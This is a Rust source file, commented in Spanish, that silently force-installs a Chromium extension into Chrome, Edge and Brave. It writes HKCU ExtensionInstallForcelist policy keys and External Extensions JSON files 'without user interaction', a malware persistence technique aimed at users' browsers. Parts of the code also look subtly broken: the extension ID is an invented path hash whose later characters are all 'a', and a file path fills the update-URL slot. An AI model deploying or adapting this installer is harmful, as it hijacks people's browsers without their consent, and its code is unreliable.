// Instalador automático de extensión Chromium
// Carga la extensión en Chrome, Edge, Brave sin interacción del usuario

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use winreg::enums::*;
use winreg::RegKey;

pub struct ExtensionInstaller {
    extension_id: String,
    extension_path: PathBuf,
}

impl ExtensionInstaller {
    pub fn new(extension_path: PathBuf) -> Self {
        // Generar ID de extensión (basado en hash del path)
        let extension_id = Self::generate_extension_id(&extension_path);

        ExtensionInstaller {
            extension_id,
            extension_path,
        }
    }

    /// Generar ID de extensión (32 caracteres a-p)
    fn generate_extension_id(path: &Path) -> String {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut hasher = DefaultHasher::new();
        path.to_string_lossy().hash(&mut hasher);
        let hash = hasher.finish();

        // Convertir a formato de ID de extensión (solo a-p)
        let mut id = String::new();
        let mut h = hash;
        for _ in 0..32 {
            let char_code = (h % 16) as u8;
            id.push((b'a' + char_code) as char);
            h /= 16;
        }

        id
    }

    /// Instalar extensión en Chrome
    pub fn install_chrome(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[+] Installing extension in Chrome...");
        let appdata = std::env::var("LOCALAPPDATA");
        if appdata.is_err() {
            println!("[!] LOCALAPPDATA env var not found");
            return Err("LOCALAPPDATA env var not found".into());
        }
        let chrome_path = PathBuf::from(appdata.unwrap())
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default");

        if !chrome_path.exists() {
            println!("[!] Chrome profile not found: {:?}", chrome_path);
            return Err("Chrome profile not found".into());
        }

        if let Err(e) = self.install_via_registry("Google\\Chrome", "Chrome") {
            println!("[!] Failed to create registry key for Chrome: {}", e);
            return Err("Registry key creation failed".into());
        }
        if let Err(e) = self.create_external_extension_file(&chrome_path, "Chrome") {
            println!(
                "[!] Failed to create external extension file for Chrome: {}",
                e
            );
            return Err("External extension file creation failed".into());
        }

        println!("[+] Chrome installation complete");
        Ok(())
    }

    /// Instalar extensión en Edge
    pub fn install_edge(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[+] Installing extension in Edge...");
        let appdata = std::env::var("LOCALAPPDATA");
        if appdata.is_err() {
            println!("[!] LOCALAPPDATA env var not found");
            return Err("LOCALAPPDATA env var not found".into());
        }
        let edge_path = PathBuf::from(appdata.unwrap())
            .join("Microsoft")
            .join("Edge")
            .join("User Data")
            .join("Default");

        if !edge_path.exists() {
            println!("[!] Edge profile not found: {:?}", edge_path);
            return Err("Edge profile not found".into());
        }

        if let Err(e) = self.install_via_registry("Microsoft\\Edge", "Edge") {
            println!("[!] Failed to create registry key for Edge: {}", e);
            return Err("Registry key creation failed".into());
        }
        if let Err(e) = self.create_external_extension_file(&edge_path, "Edge") {
            println!(
                "[!] Failed to create external extension file for Edge: {}",
                e
            );
            return Err("External extension file creation failed".into());
        }

        println!("[+] Edge installation complete");
        Ok(())
    }

    /// Instalar extensión en Brave
    pub fn install_brave(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[+] Installing extension in Brave...");
        let appdata = std::env::var("LOCALAPPDATA");
        if appdata.is_err() {
            println!("[!] LOCALAPPDATA env var not found");
            return Err("LOCALAPPDATA env var not found".into());
        }
        let brave_path = PathBuf::from(appdata.unwrap())
            .join("BraveSoftware")
            .join("Brave-Browser")
            .join("User Data")
            .join("Default");

        if !brave_path.exists() {
            println!("[!] Brave profile not found: {:?}", brave_path);
            return Err("Brave profile not found".into());
        }

        if let Err(e) = self.install_via_registry("BraveSoftware\\Brave", "Brave") {
            println!("[!] Failed to create registry key for Brave: {}", e);
            return Err("Registry key creation failed".into());
        }
        if let Err(e) = self.create_external_extension_file(&brave_path, "Brave") {
            println!(
                "[!] Failed to create external extension file for Brave: {}",
                e
            );
            return Err("External extension file creation failed".into());
        }

        println!("[+] Brave installation complete");
        Ok(())
    }

    /// Instalar via registro de Windows (HKCU)
    fn install_via_registry(
        &self,
        registry_path: &str,
        browser_name: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);

        // Crear key para extensiones
        let ext_key_path = format!(
            "Software\\Policies\\{}\\ExtensionInstallForcelist",
            registry_path
        );

        let (ext_key, _) = hkcu.create_subkey(&ext_key_path)?;

        // Agregar nuestra extensión (forzar instalación)
        let value = format!(
            "{};file:///{}",
            self.extension_id,
            self.extension_path.to_string_lossy().replace("\\", "/")
        );

        ext_key.set_value("1", &value)?;

        println!("[+] Registry key created for {}", browser_name);
        Ok(())
    }

    /// Crear archivo external_extensions.json
    fn create_external_extension_file(
        &self,
        profile_path: &Path,
        browser_name: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // Crear directorio External Extensions
        let external_dir = profile_path
            .parent()
            .ok_or("Invalid path")?
            .join("External Extensions");

        fs::create_dir_all(&external_dir)?;

        // Crear archivo JSON para la extensión
        let ext_file = external_dir.join(format!("{}.json", self.extension_id));

        let json_content = serde_json::json!({
            "external_crx": self.extension_path.to_string_lossy(),
            "external_version": "1.0.0"
        });

        let mut file = fs::File::create(&ext_file)?;
        file.write_all(json_content.to_string().as_bytes())?;

        println!("[+] External extension file created for {}", browser_name);
        Ok(())
    }

    /// Instalar en todos los navegadores disponibles
    pub fn install_all(&self) -> Vec<String> {
        let mut installed = Vec::new();

        if self.install_chrome().is_ok() {
            installed.push("Chrome".to_string());
        }

        if self.install_edge().is_ok() {
            installed.push("Edge".to_string());
        }

        if self.install_brave().is_ok() {
            installed.push("Brave".to_string());
        }

        installed
    }

    /// Verificar si una extensión está instalada
    pub fn is_installed(&self, browser: &str) -> bool {
        let registry_path = match browser {
            "Chrome" => "Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist",
            "Edge" => "Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist",
            "Brave" => "Software\\Policies\\BraveSoftware\\Brave\\ExtensionInstallForcelist",
            _ => return false,
        };

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        hkcu.open_subkey(registry_path).is_ok()
    }

    /// Desinstalar extensión (cleanup)
    pub fn uninstall(&self, browser: &str) -> Result<(), Box<dyn std::error::Error>> {
        let registry_path = match browser {
            "Chrome" => "Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist",
            "Edge" => "Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist",
            "Brave" => "Software\\Policies\\BraveSoftware\\Brave\\ExtensionInstallForcelist",
            _ => return Err("Unknown browser".into()),
        };

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        if let Ok(ext_key) = hkcu.open_subkey_with_flags(registry_path, KEY_WRITE) {
            ext_key.delete_value("1")?;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extension_id_generation() {
        let path = PathBuf::from("C:\\test\\extension");
        let id = ExtensionInstaller::generate_extension_id(&path);

        assert_eq!(id.len(), 32);
        assert!(id.chars().all(|c| ('a'..='p').contains(&c)));
    }
}
